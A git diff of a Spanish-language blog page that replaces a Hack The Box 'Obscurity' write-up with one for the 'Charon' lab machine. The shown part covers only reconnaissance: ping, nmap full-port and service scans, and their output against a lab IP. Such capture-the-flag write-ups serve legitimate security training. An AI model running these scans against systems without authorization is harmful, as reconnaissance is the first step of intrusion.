@@ -9,29 +9,29 @@
   <head>
     <meta charset="utf-8">
 
-<!-- begin _includes/seo.html --><title>            Hack The Box Obscurity - K4miyo      Ciberseguridad!      </title>
-<meta name="description" content="Resolución de la máquina Obscurity en la plataforma de Hack The Box">
+<!-- begin _includes/seo.html --><title>            Hack The Box Charon - K4miyo      Ciberseguridad!      </title>
+<meta name="description" content="Resolución de la máquina Charon en la plataforma de Hack The Box">
 
 
 
 <meta property="og:type" content="article">
 <meta property="og:locale" content="en_US">
 <meta property="og:site_name" content="K4miyo | Ciberseguridad!">
-<meta property="og:title" content="Hack The Box Obscurity">
+<meta property="og:title" content="Hack The Box Charon">
 <meta property="og:url" content="http://localhost:4000/htb-obscurity/">
 
 
-  <meta property="og:description" content="Resolución de la máquina Obscurity en la plataforma de Hack The Box">
+  <meta property="og:description" content="Resolución de la máquina Charon en la plataforma de Hack The Box">
 
 
 
-  <meta property="og:image" content="http://localhost:4000/assets/images/htb-obscurity/obscurity.jpg">
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-charon/charon.jpg">
 
 
 
 
 
-  <meta property="article:published_time" content="2022-01-09T00:00:00-06:00">
+  <meta property="article:published_time" content="2022-01-11T00:00:00-06:00">
 
 
 
@@ -168,7 +168,7 @@
         <span class="sep">/</span>
       
       
-        <li class="current">Hack The Box Obscurity</li>
+        <li class="current">Hack The Box Charon</li>
       
     
   </ol>
@@ -285,15 +285,15 @@
 
 
   <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
-    <meta itemprop="headline" content="Hack The Box Obscurity">
-    <meta itemprop="description" content="Resolución de la máquina Obscurity en la plataforma de Hack The Box">
-    <meta itemprop="datePublished" content="January 09, 2022">
+    <meta itemprop="headline" content="Hack The Box Charon">
+    <meta itemprop="description" content="Resolución de la máquina Charon en la plataforma de Hack The Box">
+    <meta itemprop="datePublished" content="January 11, 2022">
     
 
     <div class="page__inner-wrap">
       
         <header>
-          <h1 id="page-title" class="page__title" itemprop="headline">Hack The Box Obscurity
+          <h1 id="page-title" class="page__title" itemprop="headline">Hack The Box Charon
 </h1>
           
         </header>
@@ -303,46 +303,46 @@
         
         <p class="page__meta">
           
-            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2022-01-09T00:00:00-06:00">January 09, 2022 </time>&emsp;
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2022-01-11T00:00:00-06:00">January 11, 2022 </time>&emsp;
           
           
         </p>
-        <p><img src="/assets/images/htb-obscurity/banner-obscurity.jpg" alt="" /></p>
+        <p><img src="/assets/images/htb-charon/banner-charon.jpg" alt="" /></p>
 
-<h2 id="obscurity">Obscurity</h2>
-<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.10.10.168.</p>
+<h2 id="charon">Charon</h2>
+<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.10.10.31.</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.168
-PING 10.10.10.168 <span class="o">(</span>10.10.10.168<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
-64 bytes from 10.10.10.168: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>144 ms
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.31
+PING 10.10.10.31 <span class="o">(</span>10.10.10.31<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.10.10.31: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>142 ms
 
-<span class="nt">---</span> 10.10.10.168 ping statistics <span class="nt">---</span>
+<span class="nt">---</span> 10.10.10.31 ping statistics <span class="nt">---</span>
 1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
-rtt min/avg/max/mdev <span class="o">=</span> 143.565/143.565/143.565/0.000 ms
+rtt min/avg/max/mdev <span class="o">=</span> 142.073/142.073/142.073/0.000 ms
 </code></pre></div></div>
 
 <p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.168 <span class="nt">-oG</span> allPorts
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.31 <span class="nt">-oG</span> allPorts
 Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
-Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-01-05 22:00 CST
-Initiating SYN Stealth Scan at 22:00
-Scanning 10.10.10.168 <span class="o">[</span>65535 ports]
-Discovered open port 8080/tcp on 10.10.10.168
-Discovered open port 22/tcp on 10.10.10.168
-Completed SYN Stealth Scan at 22:00, 26.51s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
-Nmap scan report <span class="k">for </span>10.10.10.168
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-01-09 20:17 CST
+Initiating SYN Stealth Scan at 20:17
+Scanning 10.10.10.31 <span class="o">[</span>65535 ports]
+Discovered open port 22/tcp on 10.10.10.31
+Discovered open port 80/tcp on 10.10.10.31
+Completed SYN Stealth Scan at 20:17, 26.47s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.10.31
 Host is up, received user-set <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
-Scanned at 2022-01-05 22:00:14 CST <span class="k">for </span>27s
-Not shown: 65531 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>, 2 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+Scanned at 2022-01-09 20:17:33 CST <span class="k">for </span>26s
+Not shown: 65533 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
 Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
-PORT     STATE SERVICE    REASON
-22/tcp   open  ssh        syn-ack ttl 63
-8080/tcp open  http-proxy syn-ack ttl 63
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
 
 Read data files from: /usr/bin/../share/nmap
-Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>26.58 seconds
-           Raw packets sent: 131084 <span class="o">(</span>5.768MB<span class="o">)</span> | Rcvd: 22 <span class="o">(</span>960B<span class="o">)</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>26.54 seconds
+           Raw packets sent: 131086 <span class="o">(</span>5.768MB<span class="o">)</span> | Rcvd: 20 <span class="o">(</span>880B<span class="o">)</span>
 </code></pre></div></div>
 
 <p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>
@@ -354,598 +354,739 @@ Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up
    1   │ 
    2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
    3   │ 
-   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.10.168
-   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 22,8080
+   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.10.31
+   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 22,80
    6   │ 
    7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
 </code></pre></div></div>
 
 <p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,8080 10.10.10.168 <span class="nt">-oN</span> targeted                 
-Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-01-05 22:01 CST 
-Nmap scan report <span class="k">for </span>10.10.10.168
-Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>  
-                                                                
-PORT     STATE SERVICE    VERSION
-22/tcp   open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
-| ssh-hostkey:                                                                                                                   |   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b <span class="o">(</span>RSA<span class="o">)</span>                                                                   
-|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 <span class="o">(</span>ECDSA<span class="o">)</span>                                                                  
-|_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b <span class="o">(</span>ED25519<span class="o">)</span>                                                                
-8080/tcp open  http-proxy BadHTTPServer                                                                                          
-| fingerprint-strings:                                                                                                           
-|   GetRequest:                                                                                                                  
-|     HTTP/1.1 200 OK                                                                                                            
-|     Date: Thu, 06 Jan 2022 04:06:39                                                                                            
-|     Server: BadHTTPServer                                                                                                      
-|     Last-Modified: Thu, 06 Jan 2022 04:06:39                                                                                   
-|     Content-Length: 4171                                                                                                       
-|     Content-Type: text/html                                                                                                    
-|     Connection: Closed                                                                                                         
-|     &lt;<span class="o">!</span>DOCTYPE html&gt;                                                                                                            
-|     &lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="o">&gt;</span>                                                                                                           
-|     &lt;<span class="nb">head</span><span class="o">&gt;</span>                                                                                                                     
-|     &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"utf-8"</span><span class="o">&gt;</span>                                                                                                     
-|     &lt;title&gt;0bscura&lt;/title&gt;                                                                                                     
-|     &lt;meta http-equiv<span class="o">=</span><span class="s2">"X-UA-Compatible"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"IE=Edge"</span><span class="o">&gt;</span>                                                                      
-|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"viewport"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"width=device-width, initial-scale=1"</span><span class="o">&gt;</span>                                                       
-|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"keywords"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">""</span><span class="o">&gt;</span>                                                                                          
-|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"description"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">""</span><span class="o">&gt;</span>                                                                                       
-|     &lt;<span class="o">!</span><span class="nt">--</span>                                                                                                                       
-|     Easy Profile Template                                                                                                      
-|     http://www.templatemo.com/tm-467-easy-profile                                                                              
-|     &lt;<span class="o">!</span><span class="nt">--</span> stylesheet css <span class="nt">--</span><span class="o">&gt;</span>                                                                                                    
-|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"css/bootstrap.min.css"</span><span class="o">&gt;</span>                                                                       
-|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"css/font-awesome.min.css"</span><span class="o">&gt;</span>                                                                    
-|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"css/templatemo-blue.css"</span><span class="o">&gt;</span>                                                                     
-|     &lt;/head&gt;                                                                                                                    
-|     &lt;body data-spy<span class="o">=</span><span class="s2">"scroll"</span> data-target<span class="o">=</span><span class="s2">".navbar-collapse"</span><span class="o">&gt;</span>                                                                    
-|     &lt;<span class="o">!</span><span class="nt">--</span> preloader section <span class="nt">--</span><span class="o">&gt;</span>                                                                                                 
-|     &lt;<span class="o">!</span><span class="nt">--</span>                                                                                                                       
-|     &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"preloader"</span><span class="o">&gt;</span>                                                                                                    
-|     &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"sk-spinner sk-spinner-wordpress"</span><span class="o">&gt;</span>
-|   HTTPOptions:                                                                                                          <span class="o">[</span>24/68]
-|     HTTP/1.1 200 OK        
-|     Date: Thu, 06 Jan 2022 04:06:40                                                                                            
-|     Server: BadHTTPServer                                     
-|     Last-Modified: Thu, 06 Jan 2022 04:06:40              
-|     Content-Length: 4171                                      
-|     Content-Type: text/html                                   
-|     Connection: Closed
-|     &lt;<span class="o">!</span>DOCTYPE html&gt;
-|     &lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="o">&gt;</span>
-|     &lt;<span class="nb">head</span><span class="o">&gt;</span>
-|     &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"utf-8"</span><span class="o">&gt;</span>
-|     &lt;title&gt;0bscura&lt;/title&gt;
-|     &lt;meta http-equiv<span class="o">=</span><span class="s2">"X-UA-Compatible"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"IE=Edge"</span><span class="o">&gt;</span>
-|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"viewport"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"width=device-width, initial-scale=1"</span><span class="o">&gt;</span>
-|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"keywords"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">""</span><span class="o">&gt;</span>
-|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"description"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">""</span><span class="o">&gt;</span>
-|     &lt;<span class="o">!</span><span class="nt">--</span> 
-|     Easy Profile Template
-|     http://www.templatemo.com/tm-467-easy-profile
-|     &lt;<span class="o">!</span><span class="nt">--</span> stylesheet css <span class="nt">--</span><span class="o">&gt;</span>
-|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"css/bootstrap.min.css"</span><span class="o">&gt;</span>
-|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"css/font-awesome.min.css"</span><span class="o">&gt;</span>
-|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"css/templatemo-blue.css"</span><span class="o">&gt;</span>
-|     &lt;/head&gt;
-|     &lt;body data-spy<span class="o">=</span><span class="s2">"scroll"</span> data-target<span class="o">=</span><span class="s2">".navbar-collapse"</span><span class="o">&gt;</span>
-|     &lt;<span class="o">!</span><span class="nt">--</span> preloader section <span class="nt">--</span><span class="o">&gt;</span> 
-|     &lt;<span class="o">!</span><span class="nt">--</span>
-|     &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"preloader"</span><span class="o">&gt;</span>
-|_    &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"sk-spinner sk-spinner-wordpress"</span><span class="o">&gt;</span>
-|_http-title: 0bscura
-|_http-server-header: BadHTTPServer
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https:
-//nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port8080-TCP:V<span class="o">=</span>7.92%I<span class="o">=</span>7%D<span class="o">=</span>1/5%Time<span class="o">=</span>61D66999%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>Get
-SF:Request,10FC,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20200</span><span class="se">\x</span><span class="s2">20OK</span><span class="se">\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20Thu,</span><span class="se">\x</span><span class="s2">2006</span><span class="se">\x</span><span class="s2">20Jan</span><span class="se">\x</span><span class="s2">20202
-SF:2</span><span class="se">\x</span><span class="s2">2004:06:39</span><span class="se">\n</span><span class="s2">Server:</span><span class="se">\x</span><span class="s2">20BadHTTPServer</span><span class="se">\n</span><span class="s2">Last-Modified:</span><span class="se">\x</span><span class="s2">20Thu,</span><span class="se">\x</span><span class="s2">2006</span><span class="se">\x</span><span class="s2">
-SF:20Jan</span><span class="se">\x</span><span class="s2">202022</span><span class="se">\x</span><span class="s2">2004:06:39</span><span class="se">\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">204171</span><span class="se">\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20te
-SF:xt/html</span><span class="se">\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20Closed</span><span class="se">\n\n</span><span class="s2">&lt;!DOCTYPE</span><span class="se">\x</span><span class="s2">20html&gt;</span><span class="se">\n</span><span class="s2">&lt;html</span><span class="se">\x</span><span class="s2">20lang=</span><span class="se">\"</span><span class="s2">e
-SF:n</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&lt;head&gt;</span><span class="se">\n\t</span><span class="s2">&lt;meta</span><span class="se">\x</span><span class="s2">20charset=</span><span class="se">\"</span><span class="s2">utf-8</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\t</span><span class="s2">&lt;title&gt;0bscura&lt;/title&gt;</span><span class="se">\n</span><span class="s2">
-SF:</span><span class="se">\t</span><span class="s2">&lt;meta</span><span class="se">\x</span><span class="s2">20http-equiv=</span><span class="se">\"</span><span class="s2">X-UA-Compatible</span><span class="se">\"\x</span><span class="s2">20content=</span><span class="se">\"</span><span class="s2">IE=Edge</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\t</span><span class="s2">&lt;m
-SF:eta</span><span class="se">\x</span><span class="s2">20name=</span><span class="se">\"</span><span class="s2">viewport</span><span class="se">\"\x</span><span class="s2">20content=</span><span class="se">\"</span><span class="s2">width=device-width,</span><span class="se">\x</span><span class="s2">20initial-sc
-SF:ale=1</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\t</span><span class="s2">&lt;meta</span><span class="se">\x</span><span class="s2">20name=</span><span class="se">\"</span><span class="s2">keywords</span><span class="se">\"\x</span><span class="s2">20content=</span><span class="se">\"\"</span><span class="s2">&gt;</span><span class="se">\n\t</span><span class="s2">&lt;meta</span><span class="se">\x</span><span class="s2">20nam
-SF:e=</span><span class="se">\"</span><span class="s2">description</span><span class="se">\"\x</span><span class="s2">20content=</span><span class="se">\"\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&lt;!--</span><span class="se">\x</span><span class="s2">20</span><span class="se">\n</span><span class="s2">Easy</span><span class="se">\x</span><span class="s2">20Profile</span><span class="se">\x</span><span class="s2">20Templa
-SF:te</span><span class="se">\n</span><span class="s2">http://www</span><span class="se">\.</span><span class="s2">templatemo</span><span class="se">\.</span><span class="s2">com/tm-467-easy-profile</span><span class="se">\n</span><span class="s2">--&gt;</span><span class="se">\n\t</span><span class="s2">&lt;!--</span><span class="se">\x</span><span class="s2">20sty
-SF:lesheet</span><span class="se">\x</span><span class="s2">20css</span><span class="se">\x</span><span class="s2">20--&gt;</span><span class="se">\n\t</span><span class="s2">&lt;link</span><span class="se">\x</span><span class="s2">20rel=</span><span class="se">\"</span><span class="s2">stylesheet</span><span class="se">\"\x</span><span class="s2">20href=</span><span class="se">\"</span><span class="s2">css/boot
-SF:strap</span><span class="se">\.</span><span class="s2">min</span><span class="se">\.</span><span class="s2">css</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\t</span><span class="s2">&lt;link</span><span class="se">\x</span><span class="s2">20rel=</span><span class="se">\"</span><span class="s2">stylesheet</span><span class="se">\"\x</span><span class="s2">20href=</span><span class="se">\"</span><span class="s2">css/font-aw
-SF:esome</span><span class="se">\.</span><span class="s2">min</span><span class="se">\.</span><span class="s2">css</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\t</span><span class="s2">&lt;link</span><span class="se">\x</span><span class="s2">20rel=</span><span class="se">\"</span><span class="s2">stylesheet</span><span class="se">\"\x</span><span class="s2">20href=</span><span class="se">\"</span><span class="s2">css/templat
-SF:emo-blue</span><span class="se">\.</span><span class="s2">css</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&lt;/head&gt;</span><span class="se">\n</span><span class="s2">&lt;body</span><span class="se">\x</span><span class="s2">20data-spy=</span><span class="se">\"</span><span class="s2">scroll</span><span class="se">\"\x</span><span class="s2">20data-target=
-SF:</span><span class="se">\"\.</span><span class="s2">navbar-collapse</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\n</span><span class="s2">&lt;!--</span><span class="se">\x</span><span class="s2">20preloader</span><span class="se">\x</span><span class="s2">20section</span><span class="se">\x</span><span class="s2">20--&gt;</span><span class="se">\n</span><span class="s2">&lt;!--</span><span class="se">\n</span><span class="s2">&lt;d
-SF:iv</span><span class="se">\x</span><span class="s2">20class=</span><span class="se">\"</span><span class="s2">preloader</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\t</span><span class="s2">&lt;div</span><span class="se">\x</span><span class="s2">20class=</span><span class="se">\"</span><span class="s2">sk-spinner</span><span class="se">\x</span><span class="s2">20sk-spinner-
-SF:wordpress</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>HTTPOptions,10FC,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20200</span><span class="se">\x</span><span class="s2">20OK</span><span class="se">\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20T
-SF:hu,</span><span class="se">\x</span><span class="s2">2006</span><span class="se">\x</span><span class="s2">20Jan</span><span class="se">\x</span><span class="s2">202022</span><span class="se">\x</span><span class="s2">2004:06:40</span><span class="se">\n</span><span class="s2">Server:</span><span class="se">\x</span><span class="s2">20BadHTTPServer</span><span class="se">\n</span><span class="s2">Last-Mo
-SF:dified:</span><span class="se">\x</span><span class="s2">20Thu,</span><span class="se">\x</span><span class="s2">2006</span><span class="se">\x</span><span class="s2">20Jan</span><span class="se">\x</span><span class="s2">202022</span><span class="se">\x</span><span class="s2">2004:06:40</span><span class="se">\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">2041
-SF:71</span><span class="se">\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20text/html</span><span class="se">\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20Closed</span><span class="se">\n\n</span><span class="s2">&lt;!DOCTYPE</span><span class="se">\x</span><span class="s2">20h
-SF:tml&gt;</span><span class="se">\n</span><span class="s2">&lt;html</span><span class="se">\x</span><span class="s2">20lang=</span><span class="se">\"</span><span class="s2">en</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&lt;head&gt;</span><span class="se">\n\t</span><span class="s2">&lt;meta</span><span class="se">\x</span><span class="s2">20charset=</span><span class="se">\"</span><span class="s2">utf-8</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\t</span><span class="s2">&lt;
-SF:title&gt;0bscura&lt;/title&gt;</span><span class="se">\n\t</span><span class="s2">&lt;meta</span><span class="se">\x</span><span class="s2">20http-equiv=</span><span class="se">\"</span><span class="s2">X-UA-Compatible</span><span class="se">\"\x</span><span class="s2">20con
-SF:tent=</span><span class="se">\"</span><span class="s2">IE=Edge</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\t</span><span class="s2">&lt;meta</span><span class="se">\x</span><span class="s2">20name=</span><span class="se">\"</span><span class="s2">viewport</span><span class="se">\"\x</span><span class="s2">20content=</span><span class="se">\"</span><span class="s2">width=devi
-SF:ce-width,</span><span class="se">\x</span><span class="s2">20initial-scale=1</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\t</span><span class="s2">&lt;meta</span><span class="se">\x</span><span class="s2">20name=</span><span class="se">\"</span><span class="s2">keywords</span><span class="se">\"\x</span><span class="s2">20conten
-SF:t=</span><span class="se">\"\"</span><span class="s2">&gt;</span><span class="se">\n\t</span><span class="s2">&lt;meta</span><span class="se">\x</span><span class="s2">20name=</span><span class="se">\"</span><span class="s2">description</span><span class="se">\"\x</span><span class="s2">20content=</span><span class="se">\"\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&lt;!--</span><span class="se">\x</span><span class="s2">20</span><span class="se">\n</span><span class="s2">Ea
-SF:sy</span><span class="se">\x</span><span class="s2">20Profile</span><span class="se">\x</span><span class="s2">20Template</span><span class="se">\n</span><span class="s2">http://www</span><span class="se">\.</span><span class="s2">templatemo</span><span class="se">\.</span><span class="s2">com/tm-467-easy-prof
-SF:ile</span><span class="se">\n</span><span class="s2">--&gt;</span><span class="se">\n\t</span><span class="s2">&lt;!--</span><span class="se">\x</span><span class="s2">20stylesheet</span><span class="se">\x</span><span class="s2">20css</span><span class="se">\x</span><span class="s2">20--&gt;</span><span class="se">\n\t</span><span class="s2">&lt;link</span><span class="se">\x</span><span class="s2">20rel=</span><span class="se">\"</span><span class="s2">styleshe
-SF:et</span><span class="se">\"\x</span><span class="s2">20href=</span><span class="se">\"</span><span class="s2">css/bootstrap</span><span class="se">\.</span><span class="s2">min</span><span class="se">\.</span><span class="s2">css</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\t</span><span class="s2">&lt;link</span><span class="se">\x</span><span class="s2">20rel=</span><span class="se">\"</span><span class="s2">stylesheet</span><span class="se">\</span><span class="s2">
-SF:"</span><span class="se">\x</span><span class="nv">20href</span><span class="o">=</span><span class="se">\"</span>css/font-awesome<span class="se">\.</span>min<span class="se">\.</span>css<span class="se">\"</span><span class="o">&gt;</span><span class="se">\n\t</span>&lt;<span class="nb">link</span><span class="se">\x</span><span class="nv">20rel</span><span class="o">=</span><span class="se">\"</span>stylesheet<span class="se">\</span>
-SF:<span class="s2">"</span><span class="se">\x</span><span class="s2">20href=</span><span class="se">\"</span><span class="s2">css/templatemo-blue</span><span class="se">\.</span><span class="s2">css</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&lt;/head&gt;</span><span class="se">\n</span><span class="s2">&lt;body</span><span class="se">\x</span><span class="s2">20data-spy=</span><span class="se">\"</span><span class="s2">s
-SF:croll</span><span class="se">\"\x</span><span class="s2">20data-target=</span><span class="se">\"\.</span><span class="s2">navbar-collapse</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\n</span><span class="s2">&lt;!--</span><span class="se">\x</span><span class="s2">20preloader</span><span class="se">\x</span><span class="s2">20s
-SF:ection</span><span class="se">\x</span><span class="s2">20--&gt;</span><span class="se">\n</span><span class="s2">&lt;!--</span><span class="se">\n</span><span class="s2">&lt;div</span><span class="se">\x</span><span class="s2">20class=</span><span class="se">\"</span><span class="s2">preloader</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\t</span><span class="s2">&lt;div</span><span class="se">\x</span><span class="s2">20class=</span><span class="se">\"</span><span class="s2">sk
-SF:-spinner</span><span class="se">\x</span><span class="s2">20sk-spinner-wordpress</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 10.10.10.31 <span class="nt">-oN</span> targeted
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-01-09 20:18 CST
+Nmap scan report <span class="k">for </span>10.10.10.31
+Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 09:c7:fb:a2:4b:53:1a:7a:f3:30:5e:b8:6e:ec:83:ee <span class="o">(</span>RSA<span class="o">)</span>
+|   256 97:e0:ba:96:17:d4:a1:bb:32:24:f4:e5:15:b4:8a:ec <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 e8:9e:0b:1c:e7:2d:b6:c9:68:46:7c:b3:32:ea:e9:ef <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Frozen Yogurt Shop
